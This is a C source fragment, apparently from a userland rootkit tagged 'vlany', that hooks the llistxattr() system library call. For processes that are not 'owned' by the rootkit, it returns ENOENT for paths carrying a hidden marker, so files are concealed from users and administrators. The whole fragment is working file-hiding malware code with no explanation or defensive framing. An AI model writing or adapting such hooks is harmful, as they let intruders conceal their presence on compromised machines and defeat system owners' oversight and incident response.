ssize_t llistxattr(const char *path, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] llistxattr() called\n");
    #endif

    HOOK(old_llistxattr, CLLISTXATTR);

    if(owned()) return old_llistxattr(path, list, size);

    if(hidden_lxattr(path)) { errno = ENOENT; return -1; }

    return old_llistxattr(path, list, size);
}
